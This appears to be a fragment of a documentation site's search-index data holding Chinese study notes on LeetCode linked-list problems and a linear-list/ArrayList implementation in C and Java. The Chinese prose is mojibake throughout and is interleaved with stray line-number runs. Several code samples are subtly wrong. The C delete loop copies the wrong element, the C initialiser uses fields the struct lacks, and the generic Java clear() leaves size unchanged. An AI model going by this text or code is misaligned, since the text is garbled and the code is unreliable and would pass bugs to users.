}\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n\n\n\n# LeetCode-åè½¬é¾è¡¨\n\nç»ä½ åé¾è¡¨çå¤´èç¹ head ï¼è¯·ä½ åè½¬é¾è¡¨ï¼å¹¶è¿ååè½¬åçé¾è¡¨ã\n\nç¤ºä¾ 1ï¼\n\n\n\nè¾å¥ï¼head = [1,2,3,4,5]\nè¾åºï¼[5,4,3,2,1]\n\n\n1\n2\n\n\nç¤ºä¾ 2ï¼\n\n\n\nè¾å¥ï¼head = [1,2]\nè¾åºï¼[2,1]\n\n\n1\n2\n\n\nç¤ºä¾ 3ï¼\n\nè¾å¥ï¼head = []\nè¾åºï¼[]\n\n\n1\n2\n\n\næç¤ºï¼\n\n * é¾è¡¨ä¸­èç¹çæ°ç®èå´æ¯ [0, 5000]\n * -5000 <= Node.val <= 5000é¾è¡¨\n\n# éå½æ¹å¼\n\næè·¯ï¼\n\nè¾¹çæ¡ä»¶ï¼å½ä¼ å¥çheadä¸ºç©ºï¼è¯´æä¼ å¥çæ¯ä¸ä¸ªç©ºè¡¨ï¼æèä¼ å¥çheadçä¸ä¸ä¸ªç»ç¹ä¸ºç©ºï¼è¯´æä¼ å¥çæ¯ä¸ä¸ªåç»ç¹ãä»¥ä¸ä¸¤ç§æåµç´æ¥è¿åï¼æ²¡æå¿è¦åè½¬ã\n\néå½çæ³æ³å°±æ¯è°ç¨èªå·±å®æåè½¬ï¼åè®¾æä»¬è¿ä¸ªæ¹æ³reverseListè½å¤å®ç°åè½¬äºï¼é£ä¹å½æä»¬ä¼ å¥ä¸ä¸ªé¾è¡¨çheadçæ¶åï¼å°±å¯ä»¥å°è¯¥é¾è¡¨åè½¬ï¼é£ä¹å½æä»¬ä¼ å¥headçä¸ä¸ä¸ªçæ¶åï¼æå³çä»headçä¸ä¸ä¸ªç»ç¹å¼å§ï¼å·²ç»å®æäºåè½¬äºãå¦å¾æç¤ºï¼\n\n\n\næä»¬åªéè¦å°å¤´ç»ç¹çä¸ä¸ä¸ªç»ç¹çä¸ä¸ä¸ªç»ç¹æåå¤´ç»ç¹ï¼å¹¶ä¸å°å¤´ç»ç¹çä¸ä¸ä¸ªç»ç¹æåç©ºå³å¯ã\n\npublic ListNode reverseList(ListNode head) {\n  if (head == null || head.next == null) return head;\n  ListNode newHead = reverseList(head.next);\n  head.next.next = head;\n  head.next = null;\n  return newHead;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# è¿­ä»£æ¹å¼\n\nè¿­ä»£æ¹å¼å°±ç¸å¯¹æ¥è®²ç®åä¸äºï¼ä½¿ç¨åæéçåæ³ãå¦ä¸ä»£ç æç¤ºï¼\n\nclass Solution {\n  public ListNode reverseList(ListNode head) {\n    if (head == null || head.next == null) return head;\n    ListNode newHead = null;\n    while (head!= null){\n      ListNode tmp = head.next;\n      head.next = newHead;\n      newHead = head;\n      head = tmp;\n    }\n    return newHead;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\né¦åå®ä¹ä¸ä¸ªä¸´æ¶æéï¼æåheadçä¸ä¸ä¸ªç»ç¹ï¼é²æ­¢headçä¸ä¸ä¸ªç»ç¹éæ°èµå¼åä¸¢å¤±ãç¶åå°headçä¸ä¸ä¸ªç»ç¹æånewHeadï¼å°newHeadæåheadï¼ç¶åå°headæåtmpãå¦å¾æç¤ºï¼\n\n\n\n\n# LeetCode - å¤æ­é¾è¡¨æ¯å¦æç¯\n\nç»ä½ ä¸ä¸ªé¾è¡¨çå¤´èç¹ head ï¼å¤æ­é¾è¡¨ä¸­æ¯å¦æç¯ã\n\nå¦æé¾è¡¨ä¸­ææä¸ªèç¹ï¼å¯ä»¥éè¿è¿ç»­è·è¸ª next æéåæ¬¡å°è¾¾ï¼åé¾è¡¨ä¸­å­å¨ç¯ã ä¸ºäºè¡¨ç¤ºç»å®é¾è¡¨ä¸­çç¯ï¼è¯æµç³»ç»åé¨ä½¿ç¨æ´æ° pos æ¥è¡¨ç¤ºé¾è¡¨å°¾è¿æ¥å°é¾è¡¨ä¸­çä½ç½®ï¼ç´¢å¼ä» 0 å¼å§ï¼ãæ³¨æï¼pos ä¸ä½ä¸ºåæ°è¿è¡ä¼ é ãä»ä»æ¯ä¸ºäºæ è¯é¾è¡¨çå®éæåµã\n\nå¦æé¾è¡¨ä¸­å­å¨ç¯ ï¼åè¿å true ã å¦åï¼è¿å false ã\n\nç¤ºä¾ 1ï¼\n\n\n\nè¾å¥ï¼head = [3,2,0,-4], pos = 1\nè¾åºï¼true\nè§£éï¼é¾è¡¨ä¸­æä¸ä¸ªç¯ï¼å¶å°¾é¨è¿æ¥å°ç¬¬äºä¸ªèç¹ã\n\n\n1\n2\n3\n\n\nç¤ºä¾ 2ï¼\n\n\n\nè¾å¥ï¼head = [1,2], pos = 0\nè¾åºï¼true\nè§£éï¼é¾è¡¨ä¸­æä¸ä¸ªç¯ï¼å¶å°¾é¨è¿æ¥å°ç¬¬ä¸ä¸ªèç¹ã\n\n\n1\n2\n3\n\n\nç¤ºä¾ 3ï¼\n\n\n\nè¾å¥ï¼head = [1], pos = -1\nè¾åºï¼false\nè§£éï¼é¾è¡¨ä¸­æ²¡æç¯ã\n\n\n1\n2\n3\n\n\næç¤ºï¼\n\n * é¾è¡¨ä¸­èç¹çæ°ç®èå´æ¯ [0, 104]\n * -105 <= Node.val <= 105\n * pos ä¸º -1 æèé¾è¡¨ä¸­çä¸ä¸ª ææç´¢å¼ ã\n\nå¯ä»¥ä½¿ç¨å¿«æ¢æéçæ¹å¼ï¼å°±åå¨æåºè·æ­¥ï¼å¿«çä¸å®ä¼åæ¢çæéå ï¼æ²¡æéå å°±è¯´æä¸æ¯ç¯å½¢çã\n\npublic boolean hasCycle(ListNode head) {\n  if (head == null || head.next == null) return false;\n  ListNode fast = head.next;\n  ListNode slow = head;\n  while (fast != null && fast.next != null){\n    if (fast ==slow ){\n      return true;\n    }\n    fast = fast.next.next;\n    slow = slow.next;\n  }\n  return false;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# LeetCode-ç§»é¤é¾è¡¨çåç´ \n\nç»ä½ ä¸ä¸ªé¾è¡¨çå¤´èç¹ head åä¸ä¸ªæ´æ° val ï¼è¯·ä½ å é¤é¾è¡¨ä¸­æææ»¡è¶³ Node.val == val çèç¹ï¼å¹¶è¿å æ°çå¤´èç¹ ã\n\nç¤ºä¾ 1ï¼\n\n\n\nè¾å¥ï¼head = [1,2,6,3,4,5,6], val = 6\nè¾åºï¼[1,2,3,4,5]\n\n\n1\n2\n\n\nç¤ºä¾ 2ï¼\n\nè¾å¥ï¼head = [], val = 1\nè¾åºï¼[]\n\n\n1\n2\n\n\nç¤ºä¾ 3ï¼\n\nè¾å¥ï¼head = [7,7,7,7], val = 7\nè¾åºï¼[]\n\n\n1\n2\n\n\næç¤ºï¼\n\n * åè¡¨ä¸­çèç¹æ°ç®å¨èå´ [0, 104] å\n * 1 <= Node.val <= 50\n * 0 <= val <= 50\n\n# éå½\n\n\n\npublic ListNode removeElements(ListNode head, int val) {\n  if (head == null) return head;\n\n  head.next = removeElements(head.next, val);\n\n  return head.val == val ? head.next : head;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# è¿­ä»£\n\nä½¿ç¨åæéçæ¹å¼è¿è¡æä½ã\n\n\n\npublic ListNode removeElements(ListNode head, int val) {\n  if (head == null) return head;\n  ListNode node = new ListNode(1);\n  node.next = head;\n  ListNode tmp = node;\n  while (tmp.next != null){\n    if (tmp.next.val == val){\n      tmp.next = tmp.next.next;\n    }else {\n      tmp = tmp.next;\n    }\n  }\n  return node.next;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n',normalizedContent:'# çº¿æ§è¡¨\n\n> çº¿æ§è¡¨åæ ãéåãä¸²ä»¥åæ°ç»é½å±äºçº¿æ§ç»æãçº¿æ§ç»æåºæ¬ç¹ç¹æ¯é¤äºç¬¬ä¸ä¸ªåç´ æ ç´æ¥åé©±ãæåä¸ä¸ªåç´ æ ç´æ¥åç»§ï¼å¶ä»æ°æ®åç´ é½æä¸ä¸ªåé©±ååç»§ã\n\n\n# å®ä¹åç¹ç¹\n\nçæ´»ä¸­æå¾å¤çº¿æ§è¡¨çä¾å­ï¼æ¯å¦26ä¸ªè±æå­æ¯ãå­¦çä¿¡æ¯è¡¨ç­ç­ãä»ä»¬çæ°æ®åç´ è½ç¶ä¸ç¸åï¼ä½æ¯åä¸ä¸ªçº¿æ§è¡¨ä¸­çåç´ å¿å®æç¸åçç¹æ§ã\n\nè¯¸å¦æ­¤ç±»ç±n(n>=0)ä¸ªæ°æ®ç¹æ§ç¸åçåç´ ææçæéåºåç§°ä¸ºçº¿æ§è¡¨ãçº¿æ§è¡¨ä¸­çnç§°ä¸ºçº¿æ§è¡¨çé¿åº¦ï¼n=0æ¶åä¸ºç©ºè¡¨ã\n\néç©ºçº¿æ§è¡¨éå¸¸æå¦ä¸çç¹å¾ï¼\n\n * å­å¨ä¸ºä¸ä¸ªè¢«ç§°ä¸º ç¬¬ä¸ä¸ªçæ°æ®åç´ \n * å­å¨å¯ä¸ä¸ä¸ªè¢«ç§°ä¸º æåä¸ä¸ªçæ°æ®åç´ \n * é¤äºç¬¬ä¸ä¸ªä¹å¤ï¼æ¯ä¸ªåç´ é½æä¸åªæä¸ä¸ªåé©±\n * é¤äºæåä¸ä¸ªä¹å¤ï¼æ¯ä¸ªåç´ é½æä¸åªæä¸ä¸ªåç»§\n\n\n# çº¿æ§è¡¨çç±»åå®ä¹\n\nçº¿æ§è¡¨æ¯ä¸ä¸ªååçµæ´»çæ°æ®ç»æï¼é¿åº¦å¯æ ¹æ®éæ±å¢å æç¼©ç­ï¼è¿å¯ä»¥å¯¹çº¿æ§è¡¨çåç´ è¿è¡è®¿é®ãå é¤ãæå¥ç­æä½ãä»¥ä¸ç»åºçº¿æ§è¡¨çæ½é²æ°æ®ç±»åå®ä¹ï¼\n\n\n\n\n# çº¿æ§è¡¨çé¡ºåºè¡¨ç¤ºåå®ç°ï¼cè¯­è¨çï¼\n\n\n# çº¿æ§è¡¨çé¡ºåºå­å¨è¡¨ç¤º\n\n> çº¿æ§è¡¨çé¡ºåºè¡¨ç¤ºæçæ¯ä½¿ç¨ ä¸ç»è¿ç»­å°åçå­å¨ååå­å¨çº¿æ§è¡¨çåç´ ï¼è¿ä¸ªè¡¨ç¤ºä¹ç§°ä¸ºé¡ºåºå­å¨ç»ææèé¡ºåºæ åãéå¸¸è¿ç§å­å¨ç»æççº¿æ§è¡¨ç§°ä¸º é¡ºåºè¡¨ãé»è¾ä¸ç¸é»çåç´ å¨ç©çæ¬¡åºä¸ä¹æ¯ç¸é»ç\n\nåè®¾ä¸ä¸ªåç´ å ç¨lä¸ªå­å¨ç©ºé´ï¼å¹¶ä¸å ç¨çç¬¬ä¸ä¸ªå­å¨å°åä½ä¸ºåç´ å­å¨çèµ·å§ä½ç½®ãåçº¿æ§è¡¨ä¸­ç¬¬i+1ä¸ªåç´ çå­å¨ä½ç½®åç¬¬iä¸ªåç´ çå­å¨ä½ç½®ä¹é´çå³ç³»å¦ä¸ï¼\n\nloc(ai+1) = loc(ai) + l\n\n\n1\n\n * çº¿æ§è¡¨çç¬¬ä¸ä¸ªåç´ çèµ·å§ä½ç½®loc(a1)ï¼éå¸¸ç§°ä¸ºçº¿æ§è¡¨çèµ·å§ä½ç½®æèåºå°åã\n * æ¯ä¸ªåç´ çå­å¨ä½ç½®ååç´ å¨çº¿æ§è¡¨ä¸­çä½åºææ­£æ¯\n * åªè¦ç¡®å®èµ·å§ä½ç½®ååç´ å¤§å°ï¼ä»»æåç´ çä½ç½®é½å¯éæºå­å\n * å æ­¤çº¿æ§è¡¨çé¡ºåºå­å¨ç»ææ¯ä¸ç§ éæºå­åçå­å¨ç»æã\n\n\n\nå¨é«çº§ç¨åºè®¾è®¡è¯­è¨ä¸­çæ°ç»æçç±»ä¼¼çéæºå­åç¹æ§ï¼å æ­¤éå¸¸ä½¿ç¨æ°æ®æè¿°æ°æ®ç»æä¸­çé¡ºåºå­å¨ç»æãcè¯­è¨ä¸­ççº¿æ§è¡¨å¯æè¿°å¦ä¸ï¼\n\n#define maxsize 100\ntypedef struct{\n  elemtype * elem;\n  int length;\n}sqlist;\n\n\n1\n2\n3\n4\n5\n\n * æ°ç»ç©ºé´å¤§å°ä¸ºmaxsizeéè¿åå§åå¨æåéå¾å°ï¼åå§åä¹åelemæéæåé¡ºåºè¡¨çåºå°åã\n * åç´ ç±»åelemtypeå¯ä»¥æ ¹æ®å®éç±»åè¿è¡å®ä¹ãå¯ä»¥ä¸ºint ãfloatç»è®°æ¬æ°æ®ç±»åæèstrutçç»æä½ç±»åã\n * lengthè¡¨ç¤ºé¡ºåºè¡¨ä¸­å­å¨çåç´ ä¸ªæ°ã\n\n\n# é¡ºåºè¡¨çåºæ¬æä½\n\n# 0. åå§å\n\n> é¡ºåºè¡¨çåå§åæä½æ¯æé ä¸ä¸ªç©ºçé¡ºåºè¡¨ã\n\nvoid initlist(sqlist *list){\n  // åéç©ºé´\n  list->elem = (elemtype *)malloc((size_t)(sizeof(elemtype) * default_capacity));\n  if (list->elem == null){\n    printf("%s\\n",strerror(errno));\n    exit(-1);\n  }\n\n  // åå§ååæ°\n  list->size = 0;\n  list->capacity = default_capacity;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 1. é¡ºåºè¡¨æ©å®¹\n\n> å½é¡ºåºè¡¨å­å¨ç©ºé´ä¸è¶³æ¶ï¼éè¦å¯¹é¡ºåºè¡¨è¿è¡æ©å®¹ï¼è¿éå®ä¸ºæ©å®¹ä¸¤åå¤§å°ã\n\nvoid seqlistexpand(sqlist *list){\n  list->elem = (elemtype *)realloc(list->elem,2 * list->capacity * sizeof(elemtype));\n  if (list->elem == null){\n    error();\n  }\n  list->capacity = 2 * list->capacity;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 2. åå¼\n\n> åå¼æä½æ¯æ ¹æ®æå®åç´ çä½ç½®åºå·iï¼è·åé¡ºåºè¡¨ä¸­çç¬¬iä¸ªåç´ çå¼ã\n\nelemtype getitem(sqlist *list,int index){\n  if (index < 0 || index >= list->size){\n    // é¿åº¦å¼å¸¸æ¥é\n    printf("%s\\n", strerror(errno));\n    exit(-2);\n  }\n  return list->elem[index];\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 3. æ¥æ¾\n\n> æ¥æ¾åç´ æ¯æ ¹æ®æå®åç´ å¼eï¼æ¥æ¾é¡ºåºè¡¨ä¸­ä¸ç»å®eç¸ç­çåç´ çç¬¬ä¸ä¸ªä½ç½®ï¼æååè¿åä½ç½®åºå·ï¼å¤±è´¥åè¿å-1ã\n\nint locateelem(sqlist *list,elemtype elemtype){\n  for (int i = 0; i < list->size; i++) {\n    if (elemtype == list->elem[i]){\n      return i;\n    }\n  }\n  return -1;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nå½å¨é¡ºåºè¡¨ä¸­æ¥æ¾ä¸ä¸ªåç´ æ¶ï¼éè¦ä»å¤´å¼å§éåé¡ºåºè¡¨ï¼æ¯è¾çæ¬¡æ°ååå³ä¸ºåç´ å¨çº¿æ§è¡¨ä¸­çä½ç½®ã\n\nå¨æ¥æ¾æ¶ï¼ä¸ºäºç¡®å®åç´ å¨é¡ºåºè¡¨ä¸­çä½ç½®ï¼éè¦åç»å®çå¼è¿è¡æ¯è¾çæ°æ®åç´ ä¸ªæ°çææå¼ç§°ä¸ºæ¥æ¾ç®æ³é¿å¹æ¥æ¾æåæ¶çå¹³åæ¥æ¾é¿åº¦ï¼aslï¼ã\n\nåè®¾piæ¯æ¥æ¾ç¬¬iä¸ªåç´ çæ¦çï¼ciä¸ºæ¾å°è¡¨ä¸­å¶å³é®å­ä¸ç»å®çç¸ç­çç¬¬iä¸ªè®°å½æ¶ï¼åç»å®å¼å·²ç»æ¯è¾è¿çå³é®å­ä¸ªæ°ï¼åå¨é¿åº¦ä¸ºnççº¿æ§è¡¨ä¸­ï¼æ¥æ¾æåæ¶å¹³åæ¥æ¾é¿åº¦ä¸ºï¼\n\n\n\nä»æ¥æ¾çç®æ³è¿ç¨å¯ç¥ï¼å½æ¥æ¾çåç´ æ¯ç¬¬ä¸ä¸ªè®°å½æ¶ï¼åªéè¦æ¯è¾ä¸æ¬¡ï¼å½æ¥æ¾çåç´ ä¸ºæåä¸ä¸ªè®°å½æ¶ï¼åéè¦æ¯è¾næ¬¡ãåè®¾æ¯ä¸ªåç´ çæ¥æ¾æ¦çç¸ç­ï¼å³pi = 1/nï¼åå¯ä»¥åç®ä¸ºï¼\n\n\n\nå¾åºé¡ºåºè¡¨çå¼æ¥æ¾å¹³åæ¶é´å¤æåº¦ä¸ºo(n)\n\n# 4. æå¥\n\n> çº¿æ§è¡¨çæå¥æä½æ¶å¨è¡¨çæå®iä½ç½®æå¥ä¸ä¸ªæ°çåç´ eï¼å¹¶å°é¿åº¦ä¸ºnççº¿æ§è¡¨åä¸ºn+1ã\n\nelemtype listinsert(sqlist *list, int index, elemtype elem){\n  // å¤æ­ç´¢å¼æ¯å¦æ­£ç¡®\n  if (index < 0 || index > list->size){\n    error();\n  }\n\n  // å¤æ­å®¹éæ¯å¦åè¶³\n  if (list->size == list->capacity){\n    seqlistexpand(list);\n  }\n  //æå¥åç´ \n  // æ«å°¾æå¥\n  if(index == list->size){\n    list->elem[index] = elem;\n    list-> size ++;\n    return null;\n  }else{\n    for (int i = list->size ; i > index ; i--) {\n      list->elem[i] = list->elem[i - 1];\n    }\n    elemtype oldelem = list->elem[index];\n    list->elem[index] = elem;\n    list->size ++;\n    return oldelem;\n  }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\næ ¹æ®åæï¼ç®æ³æå¥æ¶çå¹³åæ¶é´å¤æåº¦ä¸ºo(n)ã\n\n# 5. å é¤æå®ä½ç½®çåç´ \n\n> å é¤åç´ æ¯æå°æå®ç´¢å¼ä½ç½®çåç´ å é¤ï¼å¹¶å°è¯¥ä½ç½®åæ¬çåç´ è¿åã\n\nelemtype listdelete(sqlist *list,int index){\n  if (index < 0 || index >= list->size){\n    error();\n  }\n  // å é¤æåä¸ä¸ªåç´ \n  if (index == list->size - 1){\n    elemtype oldelem = list->elem[index];\n    list->elem[index] = null;\n    list->size --;\n    return oldelem;\n  } else{\n    elemtype oldelem = list->elem[index];\n    for (int i = index; i < list->size - 1; ++i) {\n      list->elem[i] = list->elem[index + 1];\n    }\n    list->size --;\n    return oldelem;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\né¡ºåºè¡¨çå é¤ç®æ³å¹³åæ¶é´å¤æåº¦ä¸º:o(n)ã\n\nä»¥ä¸å°±æ¯cè¯­è¨å®ç°çé¡ºåºè¡¨çå³é®æä½ï¼ä¸é¢ä½¿ç¨javaçæ¬çå®ç°ã\n\n\n# çº¿æ§è¡¨çé¡ºåºè¡¨ç¤ºåå®ç°ï¼javaè¯­è¨çï¼\n\n> javaè¯­è¨ççé¡ºåºè¡¨ç¸å¯¹äºcè¯­è¨ççå¿½ç¥äºåºå±çä¸äºæä½ãåæ³æ´ä¸ºç®åï¼åæ¶javaè¯­è¨çarraylistå®éä¸å°±æ¯å¯¹é¡ºåºè¡¨çå®ç°ã\n\nä»¥ä¸æ¯javaçæ¬çå¨é¨ä»£ç (ä¸ä½¿ç¨èå)ï¼\n\npackage com.pwddd.list;\n\npublic class arraylist {\n\n  private static final int element_not_found = -1;\n  private int[] elems;\n  private int size;\n  private static final int default_capacity = 10;\n\n  /**\n     * æå®å¤§å°è¿è¡åå§å\n     *\n     * @param capacity èªå®ä¹å¤§å°\n     */\n  public arraylist(int capacity) {\n    capacity = capacity > default_capacity ? capacity : default_capacity;\n    elems = new int[capacity];\n  }\n\n\n  /**\n     * é»è®¤åå§å\n     */\n  public arraylist() {\n    this(default_capacity);\n  }\n\n  /**\n     * æ¸é¤ææåç´ \n     */\n  public void clear() {\n    // å¯¹äºintç±»åèè¨ï¼åªéè¦è®©size=0 æ æ³è®¿é®å³å¯\n    // å¦ææ¯å¯¹è±¡ç±»ååä¸ºäºè®©åå¾æ¶éå¨å·¥ä½ï¼åéè¦è®¾ç½®ä¸ºnull\n    size = 0;\n  }\n\n  /**\n     * åç´ çæ°é\n     *\n     * @return åç´ çæ°é\n     */\n  public int size() {\n    return size;\n  }\n\n  /**\n     * æ¯å¦ä¸ºç©º\n     *\n     * @return æ¯å¦ä¸ºç©º\n     */\n  public boolean isempty() {\n    return size == 0;\n  }\n\n  /**\n     * æ¯å¦åå«æä¸ªåç´ \n     *\n     * @param element æå®åç´ \n     * @return æ¯å¦åå«\n     */\n  public boolean contains(int element) {\n    return indexof(element) != element_not_found;\n  }\n\n  /**\n     * æ·»å åç´ å°å°¾é¨\n     *\n     * @param element æå®çåç´ \n     */\n  public void add(int element) {\n    add(size,element);\n  }\n\n  /**\n     * è·åindexä½ç½®çåç´ \n     *\n     * @param index  æå®çç´¢å¼ä½ç½®\n     * @return ç´¢å¼ä½ç½®çåç´ \n     */\n  public int get(int index) {\n    checkindex(index);\n    return elems[index];\n  }\n\n  /**\n     * è®¾ç½®indexä½ç½®çåç´ \n     *\n     * @param index æå®çç´¢å¼ä½ç½®\n     * @param element ç´¢å¼ä½ç½®åæ¥çåç´ \n     * @return åæ¥çåç´ Öµ\n     */\n  public int set(int index, int element) {\n    checkindex(index);\n    int oldelem = elems[index];\n    elems[index] = element;\n    return oldelem;\n  }\n\n  /**\n     * å¨indexä½ç½®æå¥ä¸ä¸ªåç´ \n     *\n     * @param index æå®çç´¢å¼ä½ç½®\n     * @param element ç´¢å¼ä½ç½®åæ¥çåç´ \n     */\n  public void add(int index, int element) {\n    checkindexforadd(index);\n    ensurecapacity(size + 1);\n    for (int i = size; i > index ; i --){\n      elems[i] = elems[i-1];\n    }\n    elems[index] = element;\n    size ++;\n  }\n\n  /**\n     * å é¤indexä½ç½®çåç´ \n     *\n     * @param index æå®ç´¢å¼ä½ç½®\n     * @return å é¤ä½ç½®ä¹åçåç´ \n     */\n  public int remove(int index) {\n    checkindex(index);\n    int oldelem = elems[index];\n    for (int i = index + 1; i < size ; i ++){\n      elems[i - 1] = elems[i];\n    }\n    size --;\n    return oldelem;\n  }\n\n  /**\n     * æ¥çåç´ çç´¢å¼\n     *\n     * @param element æå®æ¥æ¾çåç´ \n     * @return åç´ çç´¢å¼\n     */\n  public int indexof(int element) {\n    for (int i = 0; i < size ; i++){\n      if (elems[i] == element){\n        return i;\n      }\n    }\n    return element_not_found;\n  }\n\n  /**\n     * ä¿è¯è¦æcapacityçå®¹é\n     *\n     * @param capacity å½åå®¹é\n     */\n  private void ensurecapacity(int capacity) {\n    int oldcapacity = elems.length;\n    if (oldcapacity >= capacity) return;\n    int newcapacity = oldcapacity + (oldcapacity >> 1);\n    int[] newelems = new int[newcapacity];\n    for (int i = 0; i < elems.length; i ++){\n      newelems[i] = elems[i];\n    }\n    elems = newelems;\n  }\n\n  private void checkindex(int index){\n    if (index < 0 || index >= size){\n      throw new indexoutofboundsexception("åç´ ç´¢å¼è¶ç--"+"[index]:"+index+", [size]:"+size);\n    }\n  }\n\n  private void checkindexforadd(int index){\n    if (index < 0 || index > size){\n      throw new indexoutofboundsexception("åç´ ç´¢å¼è¶ç--"+"[index]:"+index+", [size]:"+size);\n    }\n  }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n\n\næ·»å èåçjavaå®ç°æ¹å¼ï¼\n\npackage com.pwddd.list;\n\n\npublic class arraylist<e> {\n\n  private static final int element_not_found = -1;\n  private e[] elems;\n  private int size;\n  private static final int default_capacity = 10;\n\n  /**\n     * æå®å¤§å°è¿è¡åå§å\n     *\n     * @param capacity èªå®ä¹å¤§å°\n     */\n  public arraylist(int capacity) {\n    capacity = capacity > default_capacity ? capacity : default_capacity;\n    elems = (e[]) new object[capacity];\n  }\n\n\n  /**\n     * é»è®¤åå§å\n     */\n  public arraylist() {\n    this(default_capacity);\n  }\n\n  /**\n     * æ¸é¤ææåç´ \n     */\n  public void clear() {\n    // å¯¹äºintç±»åèè¨ï¼åªéè¦è®©size=0 æ æ³è®¿é®å³å¯\n    // å¦ææ¯å¯¹è±¡ç±»ååä¸ºäºè®©åå¾æ¶éå¨å·¥ä½ï¼åéè¦è®¾ç½®ä¸ºnull\n    //        size = 0;\n    for (int i = 0; i < size; i++){\n      elems[i] = null;\n    }\n  }\n\n  /**\n     * åç´ çæ°é\n     *\n     * @return åç´ çæ°é\n     */\n  public int size() {\n    return size;\n  }\n\n  /**\n     * æ¯å¦ä¸ºç©º\n     *\n     * @return æ¯å¦ä¸ºç©º\n     */\n  public boolean isempty() {\n    return size == 0;\n  }\n\n  /**\n     * æ¯å¦åå«æä¸ªåç´ \n     *\n     * @param element æå®åç´ \n     * @return æ¯å¦åå«\n     */\n  public boolean contains(e element) {\n    return indexof(element) != element_not_found;\n  }\n\n  /**\n     * æ·»å åç´ å°å°¾é¨\n     *\n     * @param element æå®çåç´ \n     */\n  public void add(e element) {\n    add(size,element);\n  }\n\n  /**\n     * è·åindexä½ç½®çåç´ \n     *\n     * @param index  æå®çç´¢å¼ä½ç½®\n     * @return ç´¢å¼ä½ç½®çåç´ \n     */\n  public e get(int index) {\n    checkindex(index);\n    return elems[index];\n  }\n\n  /**\n     * è®¾ç½®indexä½ç½®çåç´ \n     *\n     * @param index æå®çç´¢å¼ä½ç½®\n     * @param element ç´¢å¼ä½ç½®åæ¥çåç´ \n     * @return åæ¥çåç´ Öµ\n     */\n  public e set(int index, e element) {\n    checkindex(index);\n    e oldelem = elems[index];\n    elems[index] = element;\n    return oldelem;\n  }\n\n  /**\n     * å¨indexä½ç½®æå¥ä¸ä¸ªåç´ \n     *\n     * @param index æå®çç´¢å¼ä½ç½®\n     * @param element ç´¢å¼ä½ç½®åæ¥çåç´ \n     */\n  public void add(int index, e element) {\n    checkindexforadd(index);\n    ensurecapacity(size + 1);\n    for (int i = size; i > index ; i --){\n      elems[i] = elems[i-1];\n    }\n    elems[index] = element;\n    size ++;\n  }\n\n  /**\n     * å é¤indexä½ç½®çåç´ \n     *\n     * @param index æå®ç´¢å¼ä½ç½®\n     * @return å é¤ä½ç½®ä¹åçåç´ \n     */\n  public e remove(int index) {\n    checkindex(index);\n    e oldelem = elems[index];\n    for (int i = index + 1; i < size ; i ++){\n      elems[i - 1] = elems[i];\n    }\n    elems[--size] = null;\n    return oldelem;\n  }\n\n  /**\n     * æ¥çåç´ çç´¢å¼\n     *\n     * @param element æå®æ¥æ¾çåç´ \n     * @return åç´ çç´¢å¼\n     */\n  public int indexof(e element) {\n    if (element == null) return -1;\n    for (int i = 0; i < size ; i++){\n      if (element.equals(elems[i])){\n        return i;\n      }\n    }\n    return element_not_found;\n  }\n\n  /**\n     * ä¿è¯è¦æcapacityçå®¹é\n     *\n     * @param capacity å½åå®¹é\n     */\n  private void ensurecapacity(int capacity) {\n    int oldcapacity = elems.length;\n    if (oldcapacity >= capacity) return;\n    int newcapacity = oldcapacity + (oldcapacity >> 1);\n    e[] newelems = (e[]) new object[newcapacity];\n    for (int i = 0; i < elems.length; i ++){\n      newelems[i] = elems[i];\n    }\n    elems = newelems;\n  }\n\n  private void checkindex(int index){\n    if (index < 0 || index >= size){\n      throw new indexoutofboundsexception("åç´ ç´¢å¼è¶ç--"+"[index]:"+index+", [size]:"+size);\n    }\n  }\n\n  private void checkindexforadd(int index){\n    if (index < 0 || index > size){\n      throw new indexoutofboundsexception("åç´ ç´¢å¼è¶ç--"+"[index]:"+index+", [size]:"+size);\n    }\n  